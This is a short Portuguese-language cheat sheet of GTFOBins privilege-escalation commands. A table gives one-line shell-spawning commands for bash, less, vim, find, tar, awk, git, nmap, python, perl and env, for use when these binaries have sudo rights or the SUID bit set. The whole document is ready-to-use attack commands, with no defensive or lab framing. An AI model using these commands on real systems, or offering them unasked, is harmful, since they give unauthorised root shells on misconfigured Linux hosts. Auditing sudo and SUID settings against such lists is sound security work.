# 📜 GTFOBins & Fichas Rápidas Linux

Referência rápida para bypass e execução de shell de privilégio elevado quando binários possuem permissão Sudo ou bit SUID ativo.

---

## 📊 Tabela de Referência Rápida GTFOBins

| Binário | Comando PrivEsc / Breakout |
|---------|----------------------------|
| `bash` | `bash -p` |
| `less` | `less /etc/passwd` + `!/bin/sh` |
| `vim` | `vim -c ':!/bin/sh'` |
| `find` | `find / -exec /bin/sh \;` |
| `tar` | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `git` | `git help config` + `!/bin/sh` |
| `nmap` | `nmap --interactive` + `!sh` |
| `python` | `python -c 'import os; os.system("/bin/sh")'` |
| `perl` | `perl -e 'exec "/bin/sh";'` |
| `env` | `env /bin/sh` |
